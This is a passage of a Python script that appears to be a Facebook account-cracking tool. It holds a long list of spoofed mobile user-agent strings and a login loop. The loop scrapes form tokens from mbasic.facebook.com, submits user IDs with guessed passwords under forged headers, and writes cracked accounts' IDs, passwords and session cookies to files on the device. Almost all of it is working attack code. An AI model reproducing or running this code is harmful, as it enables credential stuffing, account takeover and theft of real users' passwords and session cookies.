"Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 OPT/1.10.33",
"Mozilla/5.0 (Linux; Android 11; 21061119AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/313.0.0.7.110;]",
"Mozilla/5.0 (Linux; Android 13; 22011119UY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.2 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; 2210132C Build/UKQ1.230705.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;]",
"Mozilla/5.0 (Linux; Android 13; 2210132C Build/TKQ1.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]",
"Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi 7 Pro Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/38.0.2254.134507",
"Mozilla/5.0 (Linux; Android 9; Redmi 8 Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/297.0.0.36.116;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Build/LMY47O.H18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Mobile/14C92 [FBAN/FBIOS;FBAV/90.0.0.51.69;FBBV/56254015;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/10.2;FBSS/2;FBCR/1&1;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/o2-de;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.0.0.20.111;]",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/244.0.0.6.117;]"
"Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/288.0.0.11.115;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/309.0.0.14.114;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/65.0.0.42.81;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 23106RN0DA Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.43 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.29.119;]",
"Mozilla/5.0 (Linux; Android 13; 23106RN0DA Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/443.0.0.23.229;]",
"Mozilla/5.0 (Linux; Android 10.0.1; Redmi 11X Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/277.0.0.41.126;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 11X Build/QCOS30.85-18-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/294.6.0.39.118;]",
"Mozilla/5.0 (Linux; Android 4.4.4; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13;Redmi 5 pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/299.0.0.51.236;]",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.87 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/185.0.0.6.118;]",
"Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/327.1.0.9.118;]",
"Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/279.0.0.43.120;]",
"Mozilla/5.0 (Linux; Android 11; M2004J19C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/288.0.0.11.115;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/313.0.0.15.119;]",
"Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/334.0.0.32.119;]",
"Mozilla/5.0 (Linux; U; Android 12; fr-fr; Xiaomi 11 Lite 5G NE Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn",
"Mozilla/5.0 (Linux; Android 11; 2109119DI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.8.7",
"Mozilla/5.0 (Linux; Android 8.1.1; Redmi 11 Lite Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.565575.109 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13;Xiaomi 10 Pro Build/MBFMIEK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5060.134 Mobile Safari/537.36 EdgA/104.0.1264.77",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J3119) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200H Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG-SM-J3109 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111M Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.07.4.5054",
"Mozilla/5.0 (Linux; Android 8.1.0; GT-N7000B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-N970F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/268.0.0.15.118;]",
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
                "Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A730F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Mobile Safari/537.36 [FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
            ])
            ua = random.choice(uas)
            pro = random.choice(devua)
            ses = requests.Session()
            p_fb = ses.get("https://mbasic.facebook.com").text
            lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
            m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
            li = re.search('name="li" value="(.*?)"', str(p_fb)).group(1)
            data = {
                "lsd": lsd,
                "jazoest": jazoest,
                "m_ts": m_ts,
                "li": li,
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In",
            }
            headers = {
            'Host': 'mbasic.facebook.com',
            'method': 'POST',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            'Accept-Encoding': 'gzip',
            'content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'dpr': '1.75',
            'viewport-width': '980',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-full-version-list': '',
            'sec-ch-prefers-color-scheme': 'light',
            'upgrade-insecure-requests': '1',
            'user-agent': rua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'origin': 'https://m.prod.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2171902329619611&kid_directed_site=0&app_id=2171902329619611&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D2171902329619611%26cbt%3D1712718663368%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd3261f9021c25370%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%26client_id%3D2171902329619611%26display%3Dtouch%26domain%3Dapp.simplified.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.simplified.com%252Flogin%253Fredirect%253D%252Fvideo%2526_gl%253D1%252Aaiox86%252A_ga%252ANTY3NjE0MTg1LjE3MTI3MTg1MjI.%252A_ga_R70FZY7SM9%252AMTcxMjcxODUyMS4xLjEuMTcxMjcxODUyMi41OS4wLjA.%26locale%3Den_US%26logger_id%3Dfb7d32d55c8631da9%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df79832064cb2789df%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%2526frame%253Dfb96289a58feadea5%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv9.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df79832064cb2789df%26domain%3Dapp.simplified.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fapp.simplified.com%252Ffe8330d455a57b530%26relation%3Dopener%26frame%3Dfb96289a58feadea5%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
            po = ses.post(url, data=data, headers=headers).text
            response = ses.cookies.get_dict().keys()
            if "c_user" in response:
                cok = ses.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f" {cyan}(DEV-2F) {cid}|{pw} ")
                        break
                    else:
                        print(f" {green}(DEV-OK) {cid}|{pw} ")
                       #print(f" {white}Cookie : {green}{coki}")
                        open("/sdcard/Dev-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
            elif 'checkpoint' in response:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[DEV-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        pass
#-------------------------close-----------------------------
if __name__ == '__main__':
    menu()

    
